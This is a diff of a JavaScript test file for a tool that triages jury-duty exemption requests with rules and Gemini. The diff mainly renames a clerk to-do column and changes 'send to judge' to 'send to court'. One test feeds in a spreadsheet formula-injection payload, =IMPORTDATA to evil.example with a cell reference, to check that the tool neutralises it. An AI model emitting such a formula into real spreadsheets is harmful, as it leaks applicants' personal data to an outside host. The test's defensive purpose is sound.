@@ -92,14 +92,14 @@ test('規則判得了的申請：不呼叫 Gemini，標「規則」', () => {
   assert.equal(ai['AI 對應事由'], '年滿七十歲以上');
   assert.equal(ai['判斷來源'], '規則');
   assert.equal(ai['需人工確認'], '否');
-  assert.equal(ai['書記官待辦'], '核對身分證明後送法官', '附件只是自述，不能寫「可直接送法官」');
+  assert.equal(ai['承辦待辦'], '核對身分證明後送法院', '附件只是自述，不能寫「可直接送法官」');
 });
 
 test('AI 回傳公式時，寫進試算表前要變成純文字（防公式注入）', () => {
   const env = makeEnv({
     rows: [['t', 'C023', '申請免除', '有重大疾病、傷害或身心因素', '上個月剛做完心臟手術。']],
     props: { GEMINI_API_KEY: 'k' },
-    llm: [geminiSays({ '對應事由': '=IMPORTDATA("https://evil.example/?"&E2)', '類型': '得拒絕', 'AI建議': '可能符合', '需人工確認': '否', '理由': 'x', '書記官待辦': 'y' })],
+    llm: [geminiSays({ '對應事由': '=IMPORTDATA("https://evil.example/?"&E2)', '類型': '得拒絕', 'AI建議': '可能符合', '需人工確認': '否', '理由': 'x', '承辦待辦': 'y' })],
   });
   submit(env, 2);
   const ai = aiOf(env, 2);
@@ -129,7 +129,7 @@ test('候選人編號格式異常：一律人工確認', () => {
   const env = makeEnv({ rows: [['t', '王小明', '申請免除', '年滿 70 歲以上', '我今年 72 歲。（附身分證影本）']] });
   submit(env, 2);
   assert.equal(aiOf(env, 2)['需人工確認'], '是');
-  assert.match(aiOf(env, 2)['書記官待辦'], /編號格式異常/);
+  assert.match(aiOf(env, 2)['承辦待辦'], /編號格式異常/);
 });
 
 test('題目順序改了也找得到欄位（用標題比對）', () => {
@@ -182,15 +182,15 @@ test('writeSummary：由程式統計，不呼叫 Gemini；同一人送出多次�
   const calls = env.llmCalls.length;
   env.writeSummary();
   assert.equal(env.llmCalls.length, calls, '產生摘要不可以呼叫 Gemini');
-  const text = env.ss.getSheetByName('書記官摘要').data[0][1];
+  const text = env.ss.getSheetByName('承辦摘要').data[0][1];
   assert.match(text, /^共 2 筆免除申請/, 'C090 已改成到場，不算');
   assert.match(text, /C046：尚未分類/);
-  assert.match(text, /核對附件後可送法官（1 筆）：C055/);
+  assert.match(text, /核對附件後可送法院（1 筆）：C055/);
 });
 
-const AI_COLS = ['AI 對應事由', 'AI 類型', 'AI 建議', '需人工確認', 'AI 理由', '書記官待辦', 'AI 處理時間', '判斷來源', '規則版本'];
+const AI_COLS = ['AI 對應事由', 'AI 類型', 'AI 建議', '需人工確認', 'AI 理由', '承辦待辦', 'AI 處理時間', '判斷來源', '規則版本'];
 const needsAI = ['t', 'C023', '申請免除', '有重大疾病、傷害或身心因素', '上個月剛做完心臟手術。（附診斷證明）'];
-const aiSaysOk = geminiSays({ '對應事由': '第16條第4款', '類型': '得拒絕', 'AI建議': '可能符合', '需人工確認': '否', '理由': '心臟手術', '書記官待辦': '可直接送法官' });
+const aiSaysOk = geminiSays({ '對應事由': '第16條第4款', '類型': '得拒絕', 'AI建議': '可能符合', '需人工確認': '否', '理由': '心臟手術', '承辦待辦': '可直接送法官' });
 
 test('呼叫 Gemini 時不鎖；寫入時才鎖', () => {
   const env = makeEnv({ rows: [needsAI], props: { GEMINI_API_KEY: 'k' }, llm: [aiSaysOk] });
@@ -198,7 +198,7 @@ test('呼叫 Gemini 時不鎖；寫入時才鎖', () => {
   assert.deepEqual(env.heldDuringFetch, [false]);
   assert.equal(env.lockHeld, false, '結束後要釋放');
   assert.equal(aiOf(env, 2)['判斷來源'], 'AI');
-  assert.equal(aiOf(env, 2)['書記官待辦'], '核對附件（診斷證明）後送法官');
+  assert.equal(aiOf(env, 2)['承辦待辦'], '核對附件（診斷證明）後送法院');
 });
 
 test('編號不在通知名冊：不送 AI，要人工確認', () => {
@@ -207,14 +207,14 @@ test('編號不在通知名冊：不送 AI，要人工確認', () => {
   submit(env, 2);
   assert.equal(env.llmCalls.length, 0);
   assert.equal(aiOf(env, 2)['需人工確認'], '是');
-  assert.equal(aiOf(env, 2)['書記官待辦'], '候選人編號不在通知名冊，請核對');
+  assert.equal(aiOf(env, 2)['承辦待辦'], '候選人編號不在通知名冊，請核對');
 });
 
 test('編號格式異常、規則又判不了：不送 AI', () => {
   const env = makeEnv({ rows: [['t', '王小明', '申請免除', '有重大疾病', '身體不好。']], props: { GEMINI_API_KEY: 'k' }, llm: [aiSaysOk] });
   submit(env, 2);
   assert.equal(env.llmCalls.length, 0);
-  assert.match(aiOf(env, 2)['書記官待辦'], /編號格式異常/);
+  assert.match(aiOf(env, 2)['承辦待辦'], /編號格式異常/);
 });
 
 test('同一人後來又送出：舊的那筆不分類、不送 AI', () => {
@@ -227,7 +227,7 @@ test('同一人後來又送出：舊的那筆不分類、不送 AI', () => {
 
 test('規則改版後：舊版規則判的列會用新規則重判，AI 判的不重跑', () => {
   const env = makeEnv({ rows: [], props: { GEMINI_API_KEY: 'k' },
-    llm: [geminiSays({ '對應事由': '第16條第6款', '類型': '得拒絕', 'AI建議': '資料不足', '需人工確認': '是', '理由': '未說明為何只能由本人照顧', '書記官待辦': '請說明照顧需求' })] });
+    llm: [geminiSays({ '對應事由': '第16條第6款', '類型': '得拒絕', 'AI建議': '資料不足', '需人工確認': '是', '理由': '未說明為何只能由本人照顧', '承辦待辦': '請說明照顧需求' })] });
   env.sheet.data[0] = HEAD.concat(AI_COLS);
   // 舊版規則把「家母 85 歲」當成申請人自己的年齡
   env.sheet.data.push(['t1', 'C101', '申請免除', '要照顧家人或養育小孩，執行職務有困難', '我要照顧家母，她 85 歲了。（附戶口名簿影本）',
